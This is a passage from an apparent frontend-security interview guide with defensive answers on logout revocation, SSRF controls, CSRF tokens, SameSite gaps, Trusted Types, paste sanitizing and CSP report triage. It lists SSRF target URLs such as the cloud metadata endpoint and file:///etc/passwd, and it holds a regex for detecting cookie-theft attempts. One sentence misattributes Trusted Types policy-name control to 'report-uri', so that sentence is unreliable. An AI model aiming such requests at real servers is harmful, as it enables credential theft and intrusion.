
**Problem:** Building on Q30's auth client, implement logout that (a) clears client state immediately, (b) invalidates the refresh token server-side so it can't be reused, and (c) supports "log out of all devices." Show why client-only logout is a security bug.

```javascript
// ===== CLIENT =====
import { clearAccessToken } from './authClient'; // sets the in-memory token to null

async function logout({ everywhere = false } = {}) {
  try {
    // Server reads the HttpOnly refresh cookie, revokes it (and optionally all
    // sessions for this user), and clears the cookie via Set-Cookie; Max-Age=0.
    await fetch('/auth/logout', {
      method: 'POST',
      credentials: 'include',                       // sends the HttpOnly refresh cookie
      headers: { 'X-CSRF-Token': getCsrfToken() },  // logout is state-changing -> CSRF-protect
      body: JSON.stringify({ everywhere }),
    });
  } finally {
    // Always clear client state even if the network call fails.
    clearAccessToken();                  // 1. drop the in-memory access token
    sessionStorage.clear();              // 2. clear any non-sensitive UI state
    // 3. purge caches a service worker may hold (Q55) so private data isn't served post-logout
    if ('caches' in window) {
      const keys = await caches.keys();
      await Promise.all(keys.map((k) => caches.delete(k)));
    }
    location.assign('/login');           // 4. hard navigation -> fresh app state
  }
}

// ===== SERVER (conceptual) =====
// POST /auth/logout
//   const { everywhere } = req.body;
//   const rt = req.cookies.__Host_refresh;          // HttpOnly refresh token
//   if (everywhere) await revokeAllSessions(userId); // bump token version / clear store
//   else            await revokeRefreshToken(rt);     // denylist this token's family
//   res.setHeader('Set-Cookie',
//     '__Host-refresh=; Path=/; Secure; HttpOnly; SameSite=Strict; Max-Age=0');
//   res.status(204).end();
```

**Why client-only logout is a security bug:** if logout merely nulls the in-memory access token and redirects, the **refresh token in the `HttpOnly` cookie is still valid on the server** — anyone who captured it (or the original user on a shared machine) can mint new access tokens indefinitely. "Logout" that doesn't invalidate the durable credential server-side is theater. So the essential server work is *revoking the refresh token* (and clearing its cookie with `Max-Age=0`), which requires server-side session/refresh-token state — this is exactly why pure-stateless JWT designs struggle with logout (Q28) and why a denylist or rotating-refresh-token family is needed to make revocation real.

The "everywhere" variant is where the architecture pays off: with a per-user **token version/epoch** (Q28) or a server-side session store, `revokeAllSessions` increments a counter so *every* outstanding refresh token for that user is rejected on next use — implementing "sign out of all devices" after a password change or suspected compromise. Client-side, the discipline is to **clear everything reachable**: the in-memory token, `sessionStorage`, and — critically — any **service worker caches** that might still serve a previous user's private responses (Q55), then hard-navigate so no stale in-memory state survives. Note logout is a *state-changing* request, so it must be CSRF-protected too — an attacker forcing a victim to log out is a (minor) denial-of-service/annoyance, and more importantly login-CSRF/logout-CSRF are real classes. The interview signal: logout security lives **server-side** (revoke the durable credential), and the client's job is to *also* purge every local persistence layer, not just the variable holding the token. **Time/Space:** O(cache entries) for the purge; O(1) network.

#### Q73. [Theory] A frontend image-cropper feature fetches images by URL on behalf of the user. How can this become an SSRF-adjacent / privacy problem, and what controls apply?

This is a subtle design-review question because the vulnerability lives at the *boundary* between frontend convenience and backend power. If the image fetch happens **purely in the browser** (`<img src={userUrl}>` or a client-side `fetch`), there's no server-side SSRF — the request originates from the *user's* machine with the *user's* network position, not your server's. But there are still real problems: it can leak the user's IP and existence to an attacker-controlled URL (a tracking/deanonymization vector), it's subject to mixed-content and CORS for any pixel-reading (cropping needs canvas access, which taints cross-origin images unless CORS-enabled), and a `javascript:`/`data:` URL must be scheme-validated (Q20). The moment you move the fetch **server-side** — common, because servers bypass CORS and can normalize/resize — you've created a textbook **SSRF (Server-Side Request Forgery)**: your server will now fetch *any URL the user supplies*, including internal ones.

```
Client-side fetch (user's browser):           Server-side fetch (your backend):
  - no SSRF (user's own network)                 - SSRF risk: server reaches INTERNAL net
  - leaks user IP to target URL                   - http://169.254.169.254/  (cloud metadata!)
  - canvas tainting for cross-origin pixels       - http://localhost:6379/   (internal Redis)
  - must scheme-validate (no javascript:/data:)   - http://10.0.0.5/admin     (private services)
                                                  - file:///etc/passwd        (file scheme)
```

When the fetch is server-side, the SSRF can reach the cloud metadata endpoint (`169.254.169.254`) to steal IAM credentials, hit internal-only admin panels, port-scan the VPC, or read local files via `file://` — turning an innocuous "crop by URL" into full cloud compromise. The controls for the server-side case are layered: **(1) allowlist schemes** to `http`/`https` only; **(2) resolve the hostname and block requests to private/reserved IP ranges** (RFC 1918 `10/8`, `172.16/12`, `192.168/16`, loopback `127/8`, link-local `169.254/16`, and IPv6 equivalents) — and re-check *after* DNS resolution to defeat DNS-rebinding, ideally pinning the resolved IP for the actual connection; **(3) disable redirects** or re-validate each hop (a public URL can 302 to an internal one); **(4) cap response size and timeout**; **(5) fetch from an egress-restricted network segment** that physically can't reach internal services or the metadata endpoint (defense in depth, and the most robust control); **(6) require IMDSv2** on the cloud side so a simple GET can't grab credentials. For the client-side case the controls are scheme validation and `crossorigin="anonymous"` for canvas use, plus a `Referrer-Policy` so you don't leak the page URL to the image host. The senior framing: "fetch a URL the user gave us" is one of the most dangerous primitives in web apps, and *where* the fetch executes (browser vs server) completely changes the threat model — frontend engineers must flag any feature that pushes a user-supplied URL to the backend as a potential SSRF before it's built.

#### Q74. [Coding] Write a rate-limited, abuse-resistant client for a login form (exponential backoff + a clear server-authority note). Why is client-side throttling not enough?

**Problem:** Implement client-side login throttling with exponential backoff after failures (good UX, reduces accidental hammering) while making explicit that the *real* brute-force protection must be server-side.

```javascript
class LoginThrottle {
  #attempts = 0;
  #lockedUntil = 0;

  msUntilAllowed() {
    return Math.max(0, this.#lockedUntil - Date.now());
  }

  async submit(credentials) {
    const wait = this.msUntilAllowed();
    if (wait > 0) {
      throw new Error(`Too many attempts. Try again in ${Math.ceil(wait / 1000)}s`);
    }

    const res = await fetch('/auth/login', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(credentials),
    });

    if (res.status === 429) {
      // Honor the SERVER's authoritative limit (Retry-After) over our local guess.
      const retry = Number(res.headers.get('Retry-After') ?? 30);
      this.#lockedUntil = Date.now() + retry * 1000;
      throw new Error('Rate limited by server');
    }

    if (!res.ok) {
      this.#attempts += 1;
      // Exponential backoff with a cap: 1s, 2s, 4s, ... max 30s. Local UX only.
      const backoff = Math.min(30_000, 2 ** (this.#attempts - 1) * 1000);
      this.#lockedUntil = Date.now() + backoff;
      throw new Error('Invalid credentials');
    }

    this.#attempts = 0;            // reset on success
    this.#lockedUntil = 0;
    return res.json();
  }
}
```

**Why client-side throttling is purely cosmetic for security:** the attacker mounting a credential-stuffing or brute-force attack will *never use your form* — they'll script requests straight to `/auth/login` with `curl` or a botnet, bypassing every line above. Client throttling only slows down the honest user who fat-fingered their password; it does nothing against the adversary the protection is nominally for. So this code's legitimate value is UX (don't hammer the server on a typo, give the user a clear "wait 4 seconds" message) and being a *good citizen* that honors the server's `Retry-After`. Note it also *trusts the server's `429`/`Retry-After`* as authoritative — the client defers to the server's limit rather than inventing its own.

The real brute-force defenses are all server-side and the candidate should enumerate them: **per-account and per-IP rate limiting** (with care, since IP limits hurt users behind shared NAT and can be evaded by distributed attackers — so account-based and credential-based limiting matter most); **exponential backoff/temporary lockout server-side**; **CAPTCHA or proof-of-work after N failures** to raise the cost of automation; **credential-stuffing defenses** like checking submitted passwords against breach corpora (HaveIBeenPwned k-anonymity API) and detecting "many accounts tried from one source" patterns; **MFA/passkeys** (Q57) which make a guessed password insufficient; and **monitoring/alerting** on spikes. The interview signal: the candidate should *write* the client throttle competently but immediately and unprompted reframe it as UX-only, then locate the actual control on the server — mistaking client rate-limiting for security is the same class of error as trusting client-side authorization (Q3). **Time/Space:** O(1) per attempt; constant state.

### 🔴 Expert — extended

#### Q75. [Coding] Implement a Trusted Types policy layer for a legacy app that has dozens of `innerHTML` sinks, including a report-only rollout. Show the full setup.

**Problem:** You're enabling Trusted Types (Q19) on a large legacy app to make DOM-XSS structurally impossible. Implement: a default policy that routes all sink assignments through DOMPurify, a named policy for the few places that need raw trusted HTML, the CSP header to enforce it, and the report-only staging approach with a violation listener.

```javascript
// ===== 1. Feature-detect + create policies as early as possible (before app code) =====
if (window.trustedTypes && trustedTypes.createPolicy) {

  // The DEFAULT policy is the legacy lifeline: any string assigned to a sink
  // (el.innerHTML = str) with no explicit policy is routed through THIS.
  // It runs for EVERY unconverted sink in the old codebase, so it must sanitize.
  trustedTypes.createPolicy('default', {
    createHTML: (s) => DOMPurify.sanitize(s, { RETURN_TRUSTED_TYPE: true }),
    createScriptURL: (s) => {                 // gate script URLs to an allowlist
      const u = new URL(s, location.origin);
      if (u.origin !== location.origin) throw new Error('blocked script URL: ' + s);
      return s;
    },
    createScript: () => { throw new Error('inline script creation blocked'); },
  });

  // A NAMED policy for the rare, audited place that legitimately needs raw HTML
  // (e.g., a server-sanitized email body). Only code that imports this can use it.
  window.trustedHtmlPolicy = trustedTypes.createPolicy('trusted-html', {
    createHTML: (s) => s,                     // caller asserts s is already safe
  });
}

// ===== 2. Migrated call sites use a named policy explicitly =====
// el.innerHTML = trustedHtmlPolicy.createHTML(serverSanitizedHtml);
```

```
# ===== 3. CSP header — REPORT-ONLY first to find every violating sink =====
Content-Security-Policy-Report-Only:
  require-trusted-types-for 'script';
  trusted-types default trusted-html;
  report-uri /csp/tt-violations;
```

```javascript
// ===== 4. Collect violations in staging/prod without breaking anything =====
document.addEventListener('securitypolicyviolation', (e) => {
  if (e.violatedDirective.includes('trusted-types') ||
      e.violatedDirective.includes('require-trusted-types')) {
    navigator.sendBeacon('/csp/tt-violations', JSON.stringify({
      blocked: e.blockedURI, sample: e.sample, // 'sample' shows the offending sink/snippet
      doc: e.documentURI, line: e.lineNumber,
    }));
  }
}); // -> triage the list, migrate each sink, THEN flip to enforcing CSP.
```

**Why this structure is the right migration path:** the genius of Trusted Types for a legacy app is the **default policy** — once enforced, the browser refuses a raw string at *any* DOM-XSS sink, but instead of forcing you to find and fix dozens of `innerHTML` lines up front, the default policy intercepts *all* of them and runs DOMPurify, so the app keeps working while you've moved sanitization to *one auditable place* (Q19). You then migrate the genuinely-trusted call sites to an explicit named policy (`trusted-html`) so they're searchable and reviewable, and you can eventually tighten or remove the default. The `report-uri` element of `trusted-types` controls *which* policy names are even allowed to exist, preventing an attacker from creating their own bypass policy.

The **report-only rollout** is what makes this safe at scale (mirroring Q18): `Content-Security-Policy-Report-Only: require-trusted-types-for 'script'` *reports* every sink that receives an unconverted string without *blocking* it, so you collect a complete inventory of violating call sites from real traffic — the `e.sample` field even shows the offending snippet — triage and migrate them, and only then flip to the enforcing `Content-Security-Policy` header. The expert details that distinguish a real answer: create policies *before* any app code runs (a violation that fires before the policy exists can't be handled); feature-detect because Trusted Types support is strong in Chromium but you need a polyfill + graceful fallback elsewhere; and recognize this shifts the security model from "audit thousands of sinks" to "audit a handful of policies," which is the entire point. The throughline: Trusted Types + a sanitizing default policy lets you make DOM XSS *structurally impossible* on a legacy codebase *incrementally*, with report-only as the de-risking mechanism.

#### Q76. [Theory] Design exercise: architect the security model for a browser-based collaborative editor (multiple users editing shared rich-text in real time). Enumerate the trust boundaries and the XSS, authz, and data-isolation risks.

A real-time collaborative rich-text editor is one of the hardest frontend security designs because it combines *user-authored HTML* (XSS surface), *content that propagates to every collaborator in real time* (a stored-XSS amplifier), *fine-grained authorization* (who can view/edit/comment on which document), and a *persistent transport* (WebSockets, Q38). I'd map the trust boundaries first, because every risk hangs off one of them.

```
Trust boundaries in a collaborative editor
-------------------------------------------------------------------------------------
  User A's browser ──► (1) WebSocket/CRDT sync server ──► (2) persistence/DB
        │                        │                              │
        │                        ▼                              ▼
        │              broadcasts A's edits to        stored doc served to
        │              every other collaborator        future sessions
        ▼                  (XSS amplifier!)
  renders OTHER users' content in A's DOM  <-- (3) the cross-user XSS boundary
```

**XSS — the dominant risk, and uniquely amplified.** Each user authors rich text that is immediately rendered in *every other collaborator's* DOM, so a single malicious edit is instant stored XSS against everyone in the document — worse than a comment field because it's live and persistent in the shared state. The design must therefore **sanitize content rigorously and consistently** at a controlled chokepoint. The key architectural decision is to **not store/sync arbitrary HTML at all**: use a structured document model (a CRDT/OT tree of typed nodes — paragraph, bold-run, link with a validated href) rather than an HTML blob, and render that model through framework bindings that escape by default. If you must support pasted HTML, sanitize with DOMPurify (Q65) **on input, server-side, before it enters the shared state**, and again defensively on render, backed by a strict CSP + Trusted Types so even a sanitizer bypass can't execute. Links need scheme validation (Q20); pasted images need the upload pipeline (Q67).

**Authorization and data isolation.** Every edit operation over the WebSocket must be **authorized server-side per document and per operation** — you can't trust the client's claim that it may edit doc X, and a long-lived socket can outlive a permission revocation (Q38), so re-check authz on each op, not just at connect. The sync server must **scope broadcast strictly to the document's authorized collaborators** — a bug that leaks operations to the wrong room is a cross-tenant data breach, so room membership must be server-enforced, not client-asserted. Presence/cursor metadata (names, emails) is also data that must respect document ACLs. **Transport:** `wss://` only, validate `Origin` and require an anti-CSRF token on the handshake to prevent Cross-Site WebSocket Hijacking (Q38), authenticate the connection to a user, and rate-limit/size-cap operations to prevent a malicious client from DoSing the room or exhausting server memory with a flood of ops.

The expert synthesis: a collaborative editor multiplies the usual risks because **content is both untrusted *and* broadcast in real time to others**, so the architecture's job is to (a) eliminate raw HTML in favor of a structured, sanitized-at-the-boundary model so XSS can't enter the shared state, (b) enforce per-document, per-operation authorization and strict room scoping server-side so the sync layer can't leak across users, and (c) harden the persistent WebSocket transport against hijacking and abuse — all behind a strict CSP/Trusted Types backstop. The single most important decision is refusing to treat the document as an HTML string; once it's a typed tree validated at the sync boundary, the entire XSS-amplification problem largely dissolves.

#### Q77. [Coding] Implement a clipboard-paste sanitizer that safely handles rich HTML pasted into a contenteditable, preserving formatting but stripping XSS and data exfiltration vectors.

**Problem:** A rich-text editor uses `contenteditable`, and users paste HTML copied from arbitrary sources (other web pages, Word, email). Raw paste injects whatever HTML was on the clipboard — including scripts, event handlers, remote-loading `<img>`/`<link>` (tracking + exfiltration), and hostile styles. Intercept the paste, sanitize it, and insert safe formatted HTML.

```javascript
const PASTE_CONFIG = {
  ALLOWED_TAGS: ['b','strong','i','em','u','a','p','br','ul','ol','li','h1','h2','h3','blockquote','code','pre'],
  ALLOWED_ATTR: ['href'],                 // no style/class/src/on*; kills tracking pixels + CSS
  ALLOWED_URI_REGEXP: /^(?:https?:|mailto:)$/i,
  FORBID_TAGS: ['style','script','img','link','meta','iframe','object','embed'],
};

DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('rel', 'noopener noreferrer nofollow');
    node.setAttribute('target', '_blank');
  }
});

editor.addEventListener('paste', (e) => {
  e.preventDefault();                                  // take control of what gets inserted
  const dt = e.clipboardData;
  const html = dt.getData('text/html');
  const plain = dt.getData('text/plain');

  if (html) {
    const clean = DOMPurify.sanitize(html, PASTE_CONFIG);
    insertSanitizedHtml(clean);                        // see insertion note below
  } else {
    // No HTML flavor -> insert plain text as a text node (never as HTML).
    document.getSelection()?.getRangeAt(0).insertNode(document.createTextNode(plain));
  }
});

function insertSanitizedHtml(cleanHtml) {
  // Parse the SANITIZED string into nodes and insert via DOM APIs (avoid a second
  // raw-innerHTML round-trip that could re-trigger mutation). With Trusted Types
  // enforced, route through your trusted-html policy here (Q75).
  const tpl = document.createElement('template');
  tpl.innerHTML = cleanHtml;                           // cleanHtml is already DOMPurify-safe
  const sel = document.getSelection();
  if (sel?.rangeCount) {
    const range = sel.getRangeAt(0);
    range.deleteContents();
    range.insertNode(tpl.content);
  }
}
```

**Why paste is a distinct, often-missed XSS sink:** developers harden their *form submission* path but forget that `contenteditable` paste injects HTML directly into the live DOM *before* anything is submitted — the browser's default paste behavior takes the clipboard's `text/html` flavor and inserts it as-is. Clipboard HTML is maximally untrusted: it can come from a malicious page the user copied from, and it carries not just scripts but **silent exfiltration/tracking vectors** — remote `<img src>` and `<link>` fire requests to attacker servers (revealing the user opened the doc, plus referrer leakage), and `style`/`class` can hijack layout or use CSS injection tricks. So the config deliberately strips `img`/`link`/`style` and all attributes except `href`, trading a bit of fidelity (no pasted images inline — handle those through the upload pipeline, Q67) for a dramatically smaller surface.

The subtle correctness points: I `preventDefault()` and handle insertion myself, because letting the default paste happen and "cleaning up afterward" is a race the attacker can win (scripts/handlers fire on insertion). I read both `text/html` and `text/plain` and fall back to a **text node** when there's no HTML flavor, so plain paste can never be misinterpreted as markup. Insertion of the sanitized result goes through `<template>` + DOM range APIs rather than assigning to a visible element's `innerHTML` again, and under Trusted Types (Q75) it must route through a named policy. The `afterSanitizeAttributes` hook re-applies link hardening (Q32/Q65). The expert framing: every place untrusted HTML can *enter* the DOM is a sink — submission, `postMessage`, WebSocket frames, *and clipboard paste* — and the same parser-based-allowlist discipline applies, with paste additionally demanding you suppress the default behavior and treat remote-resource tags as exfiltration risks, not just script risks. **Time/Space:** O(n) over pasted HTML size.

#### Q78. [Theory] Your CDN-hosted JS bundle could be swapped in a supply-chain attack. Beyond SRI, design a layered "client-side tamper detection and containment" strategy.

SRI (Q15) is the baseline, but it has a real gap: it protects *statically referenced* resources whose hash you pinned, and it doesn't help with **dynamically injected scripts, first-party bundles you rebuild constantly, inline third-party tags, or runtime tampering after load**. A staff-level answer designs defense in depth so that a swapped bundle is *prevented where possible, detected fast, and contained when it slips through*.

```
Layer                         Mechanism                              Stops / detects
----------------------------  -------------------------------------  -----------------------------
Prevent (load-time)           SRI on pinned 3p assets;               swapped pinned file won't run
                              self-host critical scripts             removes mutable-CDN dependency
Constrain (execution)         strict CSP: script-src nonce +         injected/foreign script can't
                              strict-dynamic; LOCK connect-src       run; skimmer can't exfiltrate
Detect (runtime, in-browser)  reporting: CSP report-to + a "canary"  fires on unexpected script /
                              monitor of script tags & outbound URLs  unexpected network egress
Detect (out-of-band)          synthetic monitoring fetches the       hash/diff of served bundle vs
                              bundle from outside, hashes & diffs    expected -> alert on swap
Contain                       sandbox 3p widgets in iframes;         compromise can't read payment
                              kill-switch / feature-flag scripts     DOM; instant disable
```

The most powerful and underused control is **`connect-src` lockdown** (the British Airways / Magecart lesson, Q23): even if an attacker swaps the bundle and executes malicious code, a CSP that allowlists *only your own API origins* for `connect-src` means the skimmer **cannot exfiltrate the stolen data** to its collection server — the `fetch`/`beacon`/`WebSocket` to `evil.com` is blocked, and the CSP violation report tells you it happened. This converts a catastrophic data breach into a contained, *observed* event. Pair it with **CSP `report-to` telemetry as an intrusion-detection signal**: a sudden spike in `script-src`/`connect-src` violations on the checkout page is a live attack alarm, not just a config-tuning aid.

The other layers: **self-host and pin** critical third-party scripts (so you're not at the mercy of a mutable CDN — the polyfill.io takeover, Q16), reserving SRI for the truly-external pinned assets. **Out-of-band synthetic monitoring** fetches your production bundle from outside the network on a schedule and compares its hash/content to the expected build artifact — catching a CDN-edge swap that in-browser controls might miss. **Containment** means sandboxing risky third parties (chat, analytics) in iframes on a separate origin (Q27) so a compromise can't reach the payment DOM, plus a **kill switch** (feature flag / edge config) to disable a misbehaving script in minutes without a full deploy. And feeding into all of it: **SBOM + provenance + dependency scanning** in CI (Q16) so the supply chain is hardened *before* the bundle ships. The expert synthesis: SRI answers "did this *specific pinned file* change," but a complete strategy assumes a bundle *can* be compromised and layers **execution constraint (CSP, especially `connect-src`), runtime + out-of-band detection (CSP reports, synthetic hashing), and containment (sandboxing, kill switch)** so that tampering is unlikely, loud, and survivable rather than silent and total.

#### Q79. [Behavioral] (STAR) Tell me about a time you had to balance shipping a feature on deadline against a security concern you raised. How did you handle the disagreement?

**Situation.** On a previous team we were two days from launching a heavily-marketed "embed your dashboard anywhere" feature — customers would paste an `<iframe>` of our analytics widget into their own sites. During final review I realized the widget read configuration (filters, the dashboard ID, and a display name) from URL parameters and rendered the display name into the DOM via `innerHTML` to support "rich" titles, and the embed accepted `postMessage` calls with no origin check to update filters live. That was a stored/reflected XSS executing in *our* origin on every customer's page, plus a `postMessage` hole — a single embed could exfiltrate session data from anyone viewing it. The PM and the feature lead were under real pressure: the launch was announced, a partner had a co-marketing post scheduled.

**Task.** As the senior engineer on the review, I had to stop a security flaw from shipping without being the person who "blocks launches on principle," and ideally find a path that protected users *and* the date.

**Action.** First I made the risk concrete instead of abstract — I wrote a 30-second proof of concept that popped an alert with `document.cookie` from a test embed and screen-recorded it, because "there's an XSS" gets debated but a working exploit doesn't. Then I separated *must-fix* from *nice-to-have*: the `innerHTML` title and the unchecked `postMessage` were non-negotiable, but I proposed the *minimal* fixes rather than a redesign — switch the title to `textContent` (we didn't actually need rich titles for v1), add an origin allowlist plus schema validation to the message handler (Q70), and ship a strict CSP with locked `frame-ancestors`/`connect-src` as a backstop. I estimated those at well under a day. I brought that to the PM not as "we can't launch" but as "here's the exploit, here's a half-day fix that keeps the date, and here's the rich-title feature we defer to v1.1." I also offered to pair with the feature owner to land it fast.

**Result.** We shipped on time with the three fixes; the rich-title nicety slipped to the next sprint and nobody noticed. The PoC was what turned the conversation — once the PM *saw* the cookie exfiltration, the prioritization was immediate and there was no real disagreement left, just sequencing. Afterward I turned the incident into two durable changes: an ESLint rule flagging `innerHTML`/unchecked `postMessage` in the embed package, and an "embeds/new-origin/auth" checklist that auto-requests security review (Q50), so the next person didn't depend on me happening to catch it in review.

**Reflection.** The lesson I carry: security disagreements are usually *information* problems, not values problems — people don't want to ship XSS, they want to hit the date, and the senior move is to (1) make the risk undeniable with a concrete demonstration, (2) propose the *smallest* fix that closes the hole rather than a perfectionist redesign, and (3) protect the deadline where you can so security is seen as a partner, not a gate. And I never rely on heroic catching twice — I convert the catch into an automated guardrail so the class of bug can't recur silently.

#### Q80. [Coding] Implement a minimal but correct synchronizer-token CSRF protection as Express middleware (issue, store, verify, rotate) with timing-safe comparison.

**Problem:** Implement the server side of the synchronizer-token pattern (Q9) — the per-session CSRF token stored server-side, injected into pages, and verified on every state-changing request — with the correctness details (safe-method skip, timing-safe compare, token rotation) that distinguish a real implementation from a vulnerable toy.

```javascript
import { randomBytes, timingSafeEqual } from 'node:crypto';

function newToken() {
  return randomBytes(32).toString('base64url');  // 256 bits, unguessable
}

// Constant-time compare to avoid leaking the token byte-by-byte via timing.
function safeEqual(a, b) {
  if (typeof a !== 'string' || typeof b !== 'string') return false;
  const ba = Buffer.from(a), bb = Buffer.from(b);
  if (ba.length !== bb.length) return false;       // length check first (lengths aren't secret)
  return timingSafeEqual(ba, bb);
}

const SAFE_METHODS = new Set(['GET', 'HEAD', 'OPTIONS']);

export function csrfProtection(req, res, next) {
  // 1. Issue/store a token in the server-side session if absent.
  if (!req.session.csrfToken) req.session.csrfToken = newToken();

  // 2. Expose it to templates/JS for safe methods; do NOT verify those.
  if (SAFE_METHODS.has(req.method)) {
    res.locals.csrfToken = req.session.csrfToken;  // template: <input name="_csrf" value="...">
    return next();
  }

  // 3. Verify on state-changing requests: token from header OR body must match session.
  const sent = req.get('x-csrf-token') || req.body?._csrf;
  if (!safeEqual(sent || '', req.session.csrfToken || '')) {
    return res.status(403).json({ error: 'CSRF token invalid' });
  }

  // 4. (Optional, higher security) rotate after a successful sensitive action
  //    so a leaked token has a short useful life. Costs: breaks parallel forms.
  // req.session.csrfToken = newToken();

  return next();
}
```

**The correctness details that matter:** the token must be **cryptographically random and per-session** (256 bits via `randomBytes`), stored *server-side* in the session — that server-side storage is what distinguishes the synchronizer pattern from the double-submit pattern (Q14), and it's stronger because the token's validity doesn't depend on a cookie the client also holds. State-changing requests are verified; **safe methods (GET/HEAD/OPTIONS) are skipped** because they shouldn't mutate state and CSRF only matters for mutations — but that's also a reminder that you must *not* have state-changing GETs (Q9), or they bypass this entirely. The comparison uses **`timingSafeEqual`**, not `===`: a naive string compare returns faster on an early-mismatching byte, and over many requests an attacker can use that timing signal to recover the token character by character — a subtle but real side channel that distinguishes a security-aware implementation.

The design trade-offs to articulate: **token rotation** after sensitive actions limits the damage of a leaked token but breaks legitimate flows with multiple open forms/tabs (each would hold a now-stale token), so per-session tokens are the common pragmatic choice and per-request rotation is reserved for the highest-value operations. This pattern is **defense in depth alongside `SameSite=Lax`** (Q9), not a replacement — `SameSite` is the cheap baseline, the token covers gaps (older browsers, `SameSite=None` cookies, certain same-site sub-domain attacks). In production I'd use a maintained library (`csurf`'s successors, or the framework's built-in like Django/Rails/Spring) rather than hand-rolling, but being able to write it correctly — random token, server-side store, safe-method skip, timing-safe compare — proves you understand *why* each piece exists rather than cargo-culting a library. **Time/Space:** O(n) over token length for the compare; O(1) per session storage.

#### Q81. [Theory] Expert edge case: explain how `SameSite=Lax` can still be bypassed (the 2-minute window, method-override, GET-mutation, and sibling-domain pitfalls), and what to layer on top.

`SameSite=Lax` is the modern baseline CSRF defense, but treating it as *complete* protection is an expert-level mistake — there are several documented ways it fails to cover, and a staff engineer should know them because they're exactly the gaps a sophisticated attacker probes. `Lax` means the cookie is sent on **top-level GET navigations** but not on cross-site sub-resource requests or cross-site POST/PUT/DELETE. Each clause of that definition hides a bypass.

```
Lax bypass / gap                      Mechanism                                Layer on top
------------------------------------  ---------------------------------------  ----------------------
"Lax + POST" 2-minute window          Chrome's "Lax-allowing-unsafe" leniency  Set SameSite explicitly;
(legacy default, some configs)        sent cross-site POST cookies for 2 min   don't rely on default;
                                      after a cookie was set                   use CSRF tokens
GET that mutates state                Lax SENDS cookies on top-level GET, so   never mutate on GET;
                                      a cross-site link to /delete?id=5 works  verify Sec-Fetch (Q64)
HTTP method override                  POST tunneled via _method=DELETE or      ignore method-override
                                      X-HTTP-Method-Override on a Lax-sent GET  headers; check real method
Same-SITE (not same-origin) attacker  Lax allows same-SITE; a compromised/XSS  __Host- prefix; treat
                                      sibling subdomain is "same-site"         subdomains as untrusted;
                                                                               token + Origin check
Top-level navigation exfiltration     attacker can still cause a navigation    CSRF token for sensitive
                                      that carries the cookie                  state changes regardless
```

The most important and surprising ones: **(1) state-changing GET requests are *not* protected by Lax at all** — because `Lax` deliberately sends cookies on top-level GET navigations (so links from email/search work), a cross-site `<a href>`, `<img>`, or redirect to a mutating GET endpoint *succeeds* with cookies attached. The fix isn't a cookie setting; it's the iron rule that GET must be side-effect-free. **(2) The legacy "Lax-allowing-unsafe" two-minute window**: to avoid breaking sites during the SameSite default rollout, Chromium for a time sent cookies on cross-site POSTs if the cookie was set within the last two minutes — meaning a freshly-set session cookie was briefly CSRF-able on POST; you avoid this by setting `SameSite` *explicitly* rather than relying on the default and by not depending on Lax alone. **(3) "Same-site" is not "same-origin"** — `Lax` (and even `Strict`) consider all subdomains of your registrable domain same-site, so a compromised or attacker-controlled sibling subdomain (`evil.userpages.example.com`) can make "same-site" requests that *do* carry the cookie; this is why the `__Host-` prefix (Q31, which forbids `Domain` and requires `Path=/`) and treating subdomains as untrusted matter. **(4) Method-override tricks** can tunnel a "POST" through a Lax-permitted request shape if your framework honors `_method`/`X-HTTP-Method-Override`.

The conclusion an expert draws: `SameSite=Lax` is a strong, cheap *baseline* that kills the classic auto-submitting-form attack, but it is **not sufficient alone** — you layer (a) no-state-changing-GETs, (b) anti-CSRF tokens (Q80) or `Sec-Fetch-Site` checks (Q64) for sensitive mutations, (c) the `__Host-` prefix and a subdomain-untrusted posture to handle the same-site-isn't-same-origin gap, and (d) explicit `SameSite` declaration to avoid the legacy leniency window. CSRF defense, like everything else, is defense in depth; the candidate who says "we set SameSite=Lax, we're done" has missed the edges that get exploited in practice.

#### Q82. [Coding] Implement a Content-Security-Policy *reporter* endpoint and a client-side aggregator that distinguishes "deploy broke something" from "active attack."

**Problem:** CSP `report-to`/`report-uri` produces a firehose of violation reports. Build the server endpoint that ingests them and a triage layer that classifies each report so you can tell a benign config regression apart from a live injection attempt — turning CSP reports into both a debugging tool and an IDS (Q58).

```javascript
// ===== Server: ingest CSP reports (Reporting API v1 sends an array; legacy sends {csp-report}) =====
app.post('/csp/report',
  express.json({ type: ['application/csp-report', 'application/reports+json'] }),
  (req, res) => {
    const reports = Array.isArray(req.body) ? req.body : [req.body];
    for (const r of reports) {
      const body = r.body || r['csp-report'] || r;
      ingest({
        directive: body['effective-directive'] || body.effectiveDirective || body.violatedDirective,
        blockedUri: body['blocked-uri'] || body.blockedURL,
        documentUri: body['document-uri'] || body.documentURL,
        sample: body['script-sample'] || body.sample,        // snippet of the offender
        disposition: body.disposition,                       // 'enforce' | 'report'
        ua: req.get('user-agent'),
        ts: Date.now(),
      });
    }
    res.status(204).end();   // always 204; never let reporting affect the user
  });

// ===== Triage: classify a violation =====
const KNOWN_THIRD_PARTIES = new Set(['https://www.googletagmanager.com', 'https://js.stripe.com']);

function classify(v) {
  const uri = v.blockedUri || '';

  // Signals of an ACTIVE ATTACK (injection probing):
  if (uri.startsWith('inline') && v.directive?.includes('script')) return 'ATTACK_LIKELY'; // inline script blocked
  if (uri.startsWith('javascript:') || uri.startsWith('data:')) return 'ATTACK_LIKELY';    // scheme injection
  if (v.directive?.includes('connect-src') && isExternalUnknown(uri)) return 'ATTACK_LIKELY'; // exfil attempt
  if (v.sample && /document\.cookie|fetch\(|eval/.test(v.sample)) return 'ATTACK_LIKELY';

  // Signals of a BENIGN REGRESSION (we shipped a config gap):
  if (isKnownThirdParty(uri)) return 'CONFIG_GAP';        // a real vendor we forgot to allowlist
  if (uri.startsWith('https://') && sameSite(uri)) return 'CONFIG_GAP';

  return 'REVIEW';                                         // unknown -> human triage
}

function isExternalUnknown(uri) {
  try { return !KNOWN_THIRD_PARTIES.has(new URL(uri).origin) && new URL(uri).origin !== location?.origin; }
  catch { return true; }
}
```

